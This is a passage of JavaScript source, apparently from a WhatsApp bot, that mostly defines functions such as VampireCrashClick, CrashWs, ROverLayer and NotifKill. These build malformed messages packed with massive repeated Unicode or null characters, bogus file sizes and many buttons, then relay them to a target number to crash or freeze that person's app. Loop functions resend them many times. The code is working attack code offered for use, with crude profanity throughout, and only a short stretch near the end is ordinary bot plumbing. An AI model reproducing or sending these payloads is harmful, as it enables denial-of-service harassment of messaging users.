              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `Vampire       - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "By : Vampire™",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await conn.relayMessage(target, messagePayload, {
    additionalNodes: stanza,
    participant: { jid: target },
  });
}
async function VampireCrashClick(target, Ptcp = true) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "Rans Here" + "ꦽ".repeat(55555),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "",
          },
          contextInfo: {
            stanzaId: conn.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 3567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: " ",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption:
                    "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi",
                },
                contentText: '༑ Fail Andro - ( Vampire.Official ) ""',
                footerText: "© running since 2020 to 20##?",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(600000),
                    buttonText: {
                      displayText: "  ℂ",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: tdxlol,
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/Vampiresagara",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: '! Vampire.Bug.Bot',
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: "©Originial_Bug",
              thumbnail: tdxlol,
              sourceUrl: "go fuck yourself",
              sourceId: "dvx - problem",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `Vampire       - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "By : Vampire",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await conn.relayMessage(target, messagePayload, {
    additionalNodes: stanza,
    participant: { jid: target },
  });
}
async function Bug2(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "⿻᪶ࣼ͜͜͠͡͡͠ ̶᪶᪶᪶᪳᪳᪳ᷤ᪳᪳᪳͢⿻",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await conn.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}
        
async function FunctionCrashTesV2(target) {
  try {
    const message = {
      viewOnceMessage: {
        message: {
          buttonsResponseMessage: {
            selectedButtonId: "⿻᪶ࣼ͜͜͠͡͡͠ ̶᪶᪶᪶᪳᪳᪳ᷤ᪳᪳᪳͢⿻",
            selectedDisplayText: "⿻᪶ࣼ͜͜͠͡͡͠ ̶᪶᪶᪶᪳᪳᪳ᷤ᪳᪳᪳͢⿻",
            type: 1,
            contextInfo: {
              participant: target,
              remoteJid: "status@broadcast",
              quotedMessage: {
                buttonsMessage: {
                  contentText: "memek kau asu",
                  footerText: "Pilih salah satu",
                  buttons: [
                    {
                      buttonId: "btn1",
                      buttonText: { displayText: "OK" },
                      type: 1,
                    },
                    {
                      buttonId: "btn2",
                      buttonText: { displayText: "Cancel" },
                      type: 1,
                    },
                  ],
                  headerType: 1,
                },
              },
            },
          },
        },
      },
    };

    await conn.relayMessage(target, message, { participant: target }); 
    console.log(err);
  } catch (err) {
  }
}

async function InvisibleLoadFast(target) {
      try {

       let message = {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
              },
              interactiveMessage: {
                contextInfo: {
                  mentionedJid: [target],
                  isForwarded: true,
                  forwardingScore: 999,
                  businessMessageForwardInfo: {
                    businessOwnerJid: target,
                  },
                },
                body: {
                  text: "⿻᪶ࣼ͜͜͠͡͡͠ ̶᪶᪶᪶᪳᪳᪳ᷤ᪳᪳᪳͢⿻",
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: "",
                    },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                  ],
                },
              },
            },
          },
        };

        await conn.relayMessage(target, message, {
          participant: { jid: target },
        });
      } catch (err) {
        console.log(err);
      }
    }
    
async function invc2(target) {

     let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: ""
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "single_select",
                                        buttonParamsJson: "z"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "{}"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});

            await conn.relayMessage(target, msg.message, {
                messageId: msg.key.id,
                participant: { jid: target }
            });
        }
async function RansSpamNotif(target, Ptcp = true) {
    let virtex = "  " + "ꦾ".repeat(250000) + "@8".repeat(250000);
    await conn.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "Wkwk.",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function RansCrashTotal(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "....." + "\u0018".repeat(77777) + "@8".repeat(77777),
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await conn.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}
async function CrashWs(target) {
      let sections = [];
      for (let i = 0; i < 10000; i++) {
        let largeText = "\u0000".repeat(900000);
        let deepNested = {
          title: "\u0000".repeat(900000),
          highlight_label: "\u0000".repeat(900000),
          rows: [
            {
              title: largeText,
              id: "\u0000".repeat(900000),
              subrows: [
                {
                  title: "\u0000".repeat(900000),
                  id: "\u0000".repeat(900000),
                  subsubrows: [
                    {
                      title: "\u0000".repeat(900000),
                      id: "\u0000".repeat(900000),
                    },
                    {
                      title: "\u0000".repeat(900000),
                      id: "\u0000".repeat(900000),
                    },
                  ],
                },
                {
                  title: "\u0000".repeat(900000),
                  id: "\u0000".repeat(900000),
                },
              ],
            },
          ],
        };
        sections.push(deepNested);
      }
      let listMessage = {
        title: "\u0000".repeat(900000),
        sections: sections,
      };
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
              contextInfo: {
              stanzaId: conn.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              mentionedJid: [target],
            },
            body: {
              text: "" + "ꦾ".repeat(77777), 
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "cta_url",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "address_message",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "send_location",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };
    await conn.relayMessage(target, message, {
      participant: { jid: target },
    });
  }
async function Loadbutton(target) {
      let sections = [];
      for (let i = 0; i < 10000; i++) {
        let largeText = "\u0000".repeat(77777);
        let deepNested = {
          title: "\u0000".repeat(77777),
          highlight_label: "\u0000".repeat(77777),
          rows: [
            {
              title: largeText,
              id: "\u0000".repeat(77777),
              subrows: [
                {
                  title: "\u0000".repeat(77777),
                  id: "\u0000".repeat(77777),
                  subsubrows: [
                    {
                      title: "\u0000".repeat(77777),
                      id: "\u0000".repeat(77777),
                    },
                    {
                      title: "\u0000".repeat(77777),
                      id: "\u0000".repeat(77777),
                    },
                  ],
                },
                {
                  title: "\u0000".repeat(77777),
                  id: "\u0000".repeat(77777),
                },
              ],
            },
          ],
        };
        sections.push(deepNested);
      }
      let listMessage = {
        title: "\u0000".repeat(77777),
        sections: sections,
      };
      let message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: {
              contextInfo: {
              stanzaId: conn.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              mentionedJid: [target],
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Bokep 18+",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z",
							},
					   },
              },
              body: {
                text: "RΛ͛Ν͢Ѕ ͛͢- T͞ΞϾ͢H༻" + "ꦽ".repeat(77777)
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "\u0000".repeat(77777),
                  },
                {
                  name: "cta_url",
                  buttonParamsJson: "\u0000".repeat(77777),
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "\u0000".repeat(77777),
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "address_message",
                  buttonParamsJson: "\u0000".repeat(77777),
                },
                {
                  name: "send_location",
                  buttonParamsJson: "\u0000".repeat(77777),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "\u0000".repeat(77777),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
           name: "mpm",
           buttonParamsJson: "{}", 
                },
                {
           name: "mpm",
           buttonParamsJson: "{}", 
                },
                {
           name: "mpm",
           buttonParamsJson: "{}", 
                },
                ],
              },
            },
          },
        },
      };
      await conn.relayMessage(target, message, {
        participant: { jid: target },
    });
}
async function ROverLayer(target, ptcp = false) {
    const ransjomok = "\u200B".repeat(800000);
    let listMessage = {
        title: "Ranstech - X",
        sections: [{
            title: "\u200B".repeat(900000),
            rows: [
                { title: "\u200B".repeat(800000), rowId: "\u200B".repeat(800000) },
                { title: "\u200B".repeat(800000), rowId: "\u200B".repeat(800000) }
            ]
        }]
    };

    let ransX = generateWAMessageFromContent(target,
        proto.Message.fromObject({
            ephemeralMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "#! ~ Rans Starboy" + "ꦽ".repeat(45000),
                            "locationMessage": {
                                "degreesLatitude": -999.03499999999999,
                                "degreesLongitude": 922.999999999999,
                                "name": "SIX - TRASH",
                                "address": "M - TEXT",
                                "jpegThumbnail": "",
                            },
                            hasMediaAttachment: true
                        },
                        body: { text: "️Trash - X" + "\u0000".repeat(800000), },
                        nativeFlowMessage: {
                            messageParamsJson: "The - RansTech",
                            buttons: [
                               {
name: "single_select",
buttonParamsJson: "JSON.stringify(listMessage)"
},
{
name: "payment_method",
buttonParamsJson: "{}"
},
{
name: "call_permission_request",
buttonParamsJson: "{}"
},
{
name: "single_select",
buttonParamsJson: "JSON.stringify(listMessage)"
},
{
name: "mpm",
buttonParamsJson: "JSON.stringify(listMessage)"
}, 
{
name: "mpm",
buttonParamsJson: "JSON.stringify(listMessage)"
}, 
{
name: "mpm",
buttonParamsJson: "JSON.stringify(listMessage)"
}, 
{
name: "mpm",
buttonParamsJson: "{}"
}, 
{
name: "mpm",
buttonParamsJson: "{}"
}, 
{
name: "mpm",
buttonParamsJson: "{}"
}, 
{
name: "mpm",
buttonParamsJson: "{}"
}
                            ],
                        },
                    }
                }
            }
        }), { userJid: target }
    );

    let ransY = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    contextInfo: {
                        mentionedJid: [target],
                        isForwarded: true,
                        forwardingScore: 999
                    },
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: "X - ransTech kill you☠️" + "ꦾ".repeat(89999)
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        buttonParamsJson: JSON.stringify(listMessage)
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        buttonParamsJson: JSON.stringify(listMessage),
                        subtitle: "Unicode - X‌" + "ྀི".repeat(4999), 
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
name: "single_select",
buttonParamsJson: "JSON.stringify(listMessage)"
},
{
name: "payment_method",
buttonParamsJson: "{}"
},
{
name: "call_permission_request",
buttonParamsJson: "{}"
},
{
name: "single_select",
buttonParamsJson: "JSON.stringify(listMessage)"
},
{
name: "mpm",
buttonParamsJson: "JSON.stringify(listMessage)"
}, 
{
name: "mpm",
buttonParamsJson: "JSON.stringify(listMessage)"
}, 
{
name: "mpm",
buttonParamsJson: "JSON.stringify(listMessage)"
}, 
{
name: "mpm",
buttonParamsJson: "{}"
}, 
{
name: "mpm",
buttonParamsJson: "{}"
}, 
{
name: "mpm",
buttonParamsJson: "{}"
}, 
{
name: "mpm",
buttonParamsJson: "{}"
}
                        ]
                    })
                })
            }
        }
    }, {});
    
    await conn.relayMessage(target, ransX.message, ptcp ? { participant: { jid: target } } : {});
    await conn.relayMessage(target, ransY.message, ptcp ? { participant: { jid: target } } : {});
}
async function ransFc(target) {
    let Msg = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "." + "ꦾ".repeat(77777), 
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await conn.relayMessage(target, Msg, {
      participant: { jid: target },
    })
  }
async function ransFc2(target) {
    let Msg = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "RΛ͛Ν͢Ѕ ͛͢- T͞ΞϾ͢H" + "ꦾ".repeat(77777), 
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await conn.relayMessage(target, Msg, {
      participant: { jid: target },
    })
  }

async function NotifKill(target) {
      conn.relayMessage(target, {
          extendedTextMessage: {
            text: "RΛ͛Ν͢Ѕ ͛͢- T͞ΞϾ͢HkillYou" + "ꦽ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: conn.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              mentionedJid: [target],
              quotedMessage: {
                conversation: "ꦽ".repeat(90000),
              },
              disappearingMode: {
                initiator: 1,
                trigger: 2,
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        }, { participant: { jid: target },
        },
        {
          messageId: null,
        }
      );
    }
    
    
const glxNull = {
            key: {
                remoteJid: 'status@broadcast',
                fromMe: false,
                participant: '18002428478@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "⿻᪶ࣼ͜͜͠͡͡͠ ̶᪶᪶᪶᪳᪳᪳ᷤ᪳᪳᪳͢⿻",
                        "format": "DEFAULT",
                        "caption": "by rans"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"RansTech\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"ranstech@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(10)}\",\"screen_0_TextInput_1\":\"RANSTECH?\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }
//end func
async function funcFc(target) {
   for (let i = 0; i < 4; i++) {
   await invc2(target)
   await invc2(target)
   await invc2(target)
   await invc2(target)
   await invc2(target)
   await invc2(target)
   await invc2(target)
   await invc2(target)
   }
}
async function funcnew(target) {
   for (let i = 0; i < 4; i++) {
   await FlowX(target)
   await FlowX(target)
   await invc2(target)
   await invc2(target)
   await invc2(target)
   await FlowX(target)
   await FlowX(target)
   await invc2(target)
   await invc2(target)
   await FlowX(target)
   await FlowX(target)
   await FlowX(target)
   }
}

async function fcbeta(target) {
   for (let r = 0; r < 4; r++) {
   await OverloadCursor(target, ptcp = true)
   await OverloadCursor(target, ptcp = true)
   await FlowX(target)
   await OverloadCursor(target, ptcp = true)
   await OverloadCursor(target, ptcp = true)
   await FlowX(target)
   await OverloadCursor(target, ptcp = true)
   await OverloadCursor(target, ptcp = true)
   await FlowX(target)
   await OverloadCursor(target, ptcp = true)
   await FlowX(target)
   await OverloadCursor(target, ptcp = true)
   await FlowX(target)
   }
}
// COMBO BETA? 
if (isCmd && !isUser) {
    pendaftar.push(m.sender)
    fs.writeFileSync('./start/lib/database/pendaftar.json', JSON.stringify(pendaftar, null, 2))
}

let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}
 
msgFilter.ResetSpam(orang_spam);
        const spampm = () => {
            msgFilter.addSpam(m.sender, orang_spam);
            m.reply("don`t spam! please give pause for a few seconnds.");
        };

        const spamgr = () => {
            msgFilter.addSpam(m.sender, orang_spam);
            m.reply("don`t spam! please give 10 seconnds.");
    };

    if (isCmd && msgFilter.isFiltered(m.sender) && m.isGroup) return spampm();
    if (isCmd && msgFilter.isFiltered(m.sender) && !m.isGroup) return spamgr();

async function reply(teks) {
    conn.sendMessage(m.chat, {
        text: teks,
        mentions: conn.ments(teks),
        isForwarded: true
    }, {quoted: m})
}

async function sendMusic(teks) {
    let img = { url : cinahitam, 
               type : "image/jpeg"
              }
          
    let url = `https://whatsapp.com/channel/0029VajP9eX4SpkP50HLW03m`    
    let contextInfo = {
        externalAdReply: {    
            showAdAttribution: true,    
            title: `ransTech`,      
            body: `tell me why i'm waiting?`,     
            description: 'Now Playing ....',   
            mediaType: 2,     
            thumbnailUrl: img.url,
            mediaUrl: url   
        }
    }
    
    conn.sendMessage(m.chat, { 
        contextInfo,
        mimetype: 'audio/mp4',
        audio: teks
    }, { quoted: m })
 }
     
 if (!m.key.fromMe && global.autoread) {
     const readkey = {
         remoteJid: m.chat,
         id: m.key.id,
         participant: m.isGroup ? m.key.participant : undefined
     }
     await conn.readMessages([readkey]);
 }
        conn.sendPresenceUpdate('available', m.chat)
      
function getRandomFile(ext) {
    return `${Math.floor(Math.random() * 10000)}${ext}`;
}

        
async function makeStickerFromUrl(imageUrl, conn, m) {
    try {
        let buffer;
        if (imageUrl.startsWith("data:")) {
            const base64Data = imageUrl.split(",")[1];
            buffer = Buffer.from(base64Data, 'base64');
        } else {
